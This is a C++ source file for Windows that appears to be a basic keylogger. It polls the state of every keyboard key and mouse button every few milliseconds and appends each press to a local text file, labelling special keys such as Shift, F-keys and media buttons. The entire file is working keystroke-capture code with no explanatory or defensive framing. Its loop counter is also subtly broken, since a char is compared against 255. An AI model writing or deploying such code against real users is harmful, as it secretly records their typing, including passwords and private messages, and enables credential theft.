#include<iostream>
#include<Windows.h>
using namespace std;

int Save(int _key, const char *file);

int main(){
    
    char i;
    while (true){
        //sleep 10 to make the program less laggy
            Sleep(10);
        //loop through every Button on the keyboard or on mouse
            for(i=8; i<=255; i++){
                if (GetAsyncKeyState(i) == -32767){//if a button is pressed
                    Save(i, "file.txt");//save it to a file
                }
            }
    }

    return 0;
}
int Save(int buttonClicked, const char *file){
    //print the button to the console
        cout << buttonClicked << endl;

    Sleep(10);

    //open the file
        FILE *OUTPUT_FILE;
        OUTPUT_FILE = fopen(file, "a+");
    //if file is not open then return 1
        if (OUTPUT_FILE == NULL){
            return 1;
        }

    //if is a special button then print it to the file
        switch (buttonClicked) {
            case VK_LBUTTON:
                fprintf(OUTPUT_FILE, "%s", "[LEFT MOUSE BUTTON]");
                break;
            case VK_RBUTTON:
                fprintf(OUTPUT_FILE, "%s", "[RIGHT MOUSE BUTTON]");
                break;
            case VK_CANCEL:
                fprintf(OUTPUT_FILE, "%s", "[CANCEL]");
                break;
            case VK_MBUTTON:
                fprintf(OUTPUT_FILE, "%s", "[MBUTTON]");
                break;
            case VK_XBUTTON1:
                fprintf(OUTPUT_FILE, "%s", "[XBUTTON1]");
                break;
            case VK_XBUTTON2:
                fprintf(OUTPUT_FILE, "%s", "[XBUTTON2]");
                break;
            case VK_BACK:
                fprintf(OUTPUT_FILE, "%s", "[BACK]");
                break;
            case VK_TAB:
                fprintf(OUTPUT_FILE, "%s", "[TAB]");
                break;
            case VK_CLEAR:
                fprintf(OUTPUT_FILE, "%s", "[CLEAR]");
                break;
            case VK_RETURN:
                fprintf(OUTPUT_FILE, "%s", "[RETURN]");
                break;
            case VK_SHIFT:
                fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
                break;
            case VK_CONTROL:
                fprintf(OUTPUT_FILE, "%s", "[CTRL]");
                break;
            case VK_MENU:
                fprintf(OUTPUT_FILE, "%s", "[ALT]");
                break;
            case VK_PAUSE:
                fprintf(OUTPUT_FILE, "%s", "[PAUSE]");
                break;
            case VK_CAPITAL:
                fprintf(OUTPUT_FILE, "%s", "[CAPS LOCK]");
                break;
            case VK_ESCAPE:
                fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
                break;
            case VK_PRIOR:
                fprintf(OUTPUT_FILE, "%s", "[PAGE UP]");
                break;
            case VK_NEXT:
                fprintf(OUTPUT_FILE, "%s", "[PAGE DOWN]");
                break;
            case VK_END:
                fprintf(OUTPUT_FILE, "%s", "[END]");
                break;
            case VK_HOME:
                fprintf(OUTPUT_FILE, "%s", "[HOME]");
                break;
            case VK_LEFT:
                fprintf(OUTPUT_FILE, "%s", "[LEFT ARROW]");
                break;
            case VK_UP:
                fprintf(OUTPUT_FILE, "%s", "[UP ARROW]");
                break;
            case VK_RIGHT:
                fprintf(OUTPUT_FILE, "%s", "[RIGHT ARROW]");
                break;
            case VK_DOWN:
                fprintf(OUTPUT_FILE, "%s", "[DOWN ARROW]");
                break;
            case VK_SELECT:
                fprintf(OUTPUT_FILE, "%s", "[SELECT]");
                break;
            case VK_PRINT:
                fprintf(OUTPUT_FILE, "%s", "[PRINT]");
                break;
            case VK_EXECUTE:
                fprintf(OUTPUT_FILE, "%s", "[EXECUTE]");
                break;
            case VK_SNAPSHOT:
                fprintf(OUTPUT_FILE, "%s", "[PRINT SCREEN]");
                break;
            case VK_INSERT:
                fprintf(OUTPUT_FILE, "%s", "[INSERT]");
                break;
            case VK_DELETE:
                fprintf(OUTPUT_FILE, "%s", "[DELETE]");
                break;
            case VK_HELP:
                fprintf(OUTPUT_FILE, "%s", "[HELP]");
                break;
            case VK_LWIN:
                fprintf(OUTPUT_FILE, "%s", "[LEFT WINDOWS]");
                break;
            case VK_RWIN:
                fprintf(OUTPUT_FILE, "%s", "[RIGHT WINDOWS]");
                break;
            case VK_APPS:
                fprintf(OUTPUT_FILE, "%s", "[APPLICATIONS]");
                break;
            case VK_SLEEP:
                fprintf(OUTPUT_FILE, "%s", "[SLEEP]");
                break;
            case VK_NUMPAD0:
                fprintf(OUTPUT_FILE, "%s", "0");
                break;
            case VK_NUMPAD1:
                fprintf(OUTPUT_FILE, "%s", "1");
                break;
            case VK_NUMPAD2:
                fprintf(OUTPUT_FILE, "%s", "2");
                break;
            case VK_NUMPAD3:
                fprintf(OUTPUT_FILE, "%s", "3");
                break;
            case VK_NUMPAD4:
                fprintf(OUTPUT_FILE, "%s", "4");
                break;
            case VK_NUMPAD5:
                fprintf(OUTPUT_FILE, "%s", "5");
                break;
            case VK_NUMPAD6:
                fprintf(OUTPUT_FILE, "%s", "6");
                break;
            case VK_NUMPAD7:
                fprintf(OUTPUT_FILE, "%s", "7");
                break;
            case VK_NUMPAD8:
                fprintf(OUTPUT_FILE, "%s", "8");
                break;
            case VK_NUMPAD9:
                fprintf(OUTPUT_FILE, "%s", "9");
                break;
            case VK_MULTIPLY:
                fprintf(OUTPUT_FILE, "%s", "[MULTIPLY]");
                break;
            case VK_ADD:
                fprintf(OUTPUT_FILE, "%s", "[ADD]");
                break;
            case VK_SEPARATOR:
                fprintf(OUTPUT_FILE, "%s", "[SEPARATOR]");
                break;
            case VK_SUBTRACT:
                fprintf(OUTPUT_FILE, "%s", "[SUBTRACT]");
                break;
            case VK_DECIMAL:
                fprintf(OUTPUT_FILE, "%s", "[DECIMAL]");
                break;
            case VK_DIVIDE:
                fprintf(OUTPUT_FILE, "%s", "[DIVIDE]");
                break;
            case VK_F1:
                fprintf(OUTPUT_FILE, "%s", "[F1]");
                break;
            case VK_F2:
                fprintf(OUTPUT_FILE, "%s", "[F2]");
                break;
            case VK_F3:
                fprintf(OUTPUT_FILE, "%s", "[F3]");
                break;
            case VK_F4:
                fprintf(OUTPUT_FILE, "%s", "[F4]");
                break;
            case VK_F5:
                fprintf(OUTPUT_FILE, "%s", "[F5]");
                break;
            case VK_F6:
                fprintf(OUTPUT_FILE, "%s", "[F6]");
                break;
            case VK_F7:
                fprintf(OUTPUT_FILE, "%s", "[F7]");
                break;
            case VK_F8:
                fprintf(OUTPUT_FILE, "%s", "[F8]");
                break;
            case VK_F9:
                fprintf(OUTPUT_FILE, "%s", "[F9]");
                break;
            case VK_F10:
                fprintf(OUTPUT_FILE, "%s", "[F10]");
                break;
            case VK_F11:
                fprintf(OUTPUT_FILE, "%s", "[F11]");
                break;
            case VK_F12:
                fprintf(OUTPUT_FILE, "%s", "[F12]");
                break;
            case VK_F13:
                fprintf(OUTPUT_FILE, "%s", "[F13]");
                break;
            case VK_F14:
                fprintf(OUTPUT_FILE, "%s", "[F14]");
                break;
            case VK_F15:
                fprintf(OUTPUT_FILE, "%s", "[F15]");
                break;
            case VK_F16:
                fprintf(OUTPUT_FILE, "%s", "[F16]");
                break;
            case VK_F17:
                fprintf(OUTPUT_FILE, "%s", "[F17]");
                break;
            case VK_F18:
                fprintf(OUTPUT_FILE, "%s", "[F18]");
                break;
            case VK_F19:
                fprintf(OUTPUT_FILE, "%s", "[F19]");
                break;
            case VK_F20:
                fprintf(OUTPUT_FILE, "%s", "[F20]");
                break;
            case VK_F21:
                fprintf(OUTPUT_FILE, "%s", "[F21]");
                break;
            case VK_F22:
                fprintf(OUTPUT_FILE, "%s", "[F22]");
                break;
            case VK_F23:
                fprintf(OUTPUT_FILE, "%s", "[F23]");
                break;
            case VK_F24:
                fprintf(OUTPUT_FILE, "%s", "[F24]");
                break;
            case VK_NUMLOCK:
                fprintf(OUTPUT_FILE, "%s", "[NUM LOCK]");
                break;
            case VK_SCROLL:
                fprintf(OUTPUT_FILE, "%s", "[SCROLL LOCK]");
                break;
            case VK_LSHIFT:
                fprintf(OUTPUT_FILE, "%s", "[LEFT SHIFT]");
                break;
            case VK_RSHIFT:
                fprintf(OUTPUT_FILE, "%s", "[RIGHT SHIFT]");
                break;
            case VK_LCONTROL:
                fprintf(OUTPUT_FILE, "%s", "[LEFT CONTROL]");
                break;
            case VK_RCONTROL:
                fprintf(OUTPUT_FILE, "%s", "[RIGHT CONTROL]");
                break;
            case VK_LMENU:
                fprintf(OUTPUT_FILE, "%s", "[LEFT ALT]");
                break;
            case VK_RMENU:
                fprintf(OUTPUT_FILE, "%s", "[RIGHT ALT]");
                break;
            case VK_BROWSER_BACK:
                fprintf(OUTPUT_FILE, "%s", "[BROWSER BACK]");
                break;
            case VK_BROWSER_FORWARD:
                fprintf(OUTPUT_FILE, "%s", "[BROWSER FORWARD]");
                break;
            case VK_BROWSER_REFRESH:
                fprintf(OUTPUT_FILE, "%s", "[BROWSER REFRESH]");
                break;
            case VK_BROWSER_STOP:
                fprintf(OUTPUT_FILE, "%s", "[BROWSER STOP]");
                break;
            case VK_BROWSER_SEARCH:
                fprintf(OUTPUT_FILE, "%s", "[BROWSER SEARCH]");
                break;
            case VK_BROWSER_FAVORITES:
                fprintf(OUTPUT_FILE, "%s", "[BROWSER FAVORITES]");
                break;
            case VK_BROWSER_HOME:
                fprintf(OUTPUT_FILE, "%s", "[BROWSER HOME]");
                break;
            case VK_VOLUME_MUTE:
                fprintf(OUTPUT_FILE, "%s", "[VOLUME MUTE]");
                break;
            case VK_VOLUME_DOWN:
                fprintf(OUTPUT_FILE, "%s", "[VOLUME DOWN]");
                break;
            case VK_VOLUME_UP:
                fprintf(OUTPUT_FILE, "%s", "[VOLUME UP]");
                break;
            case VK_MEDIA_NEXT_TRACK:
                fprintf(OUTPUT_FILE, "%s", "[MEDIA NEXT TRACK]");
                break;
            case VK_MEDIA_PREV_TRACK:
                fprintf(OUTPUT_FILE, "%s", "[MEDIA PREVIOUS TRACK]");
                break;
            case VK_MEDIA_STOP:
                fprintf(OUTPUT_FILE, "%s", "[MEDIA STOP]");
                break;
            case VK_MEDIA_PLAY_PAUSE:
                fprintf(OUTPUT_FILE, "%s", "[MEDIA PLAY/PAUSE]");
                break;
            case VK_LAUNCH_MAIL:
                fprintf(OUTPUT_FILE, "%s", "[LAUNCH MAIL]");
                break;
            case VK_LAUNCH_MEDIA_SELECT:
                fprintf(OUTPUT_FILE, "%s", "[LAUNCH MEDIA SELECT]");
                break;
            case VK_LAUNCH_APP1:
                fprintf(OUTPUT_FILE, "%s", "[LAUNCH APPLICATION 1]");
                break;
            case VK_LAUNCH_APP2:
                fprintf(OUTPUT_FILE, "%s", "[LAUNCH APPLICATION 2]");
                break;
            default:
                fprintf(OUTPUT_FILE, "%c", buttonClicked);
        }

    //close the file
        fclose(OUTPUT_FILE);

    return 0;
}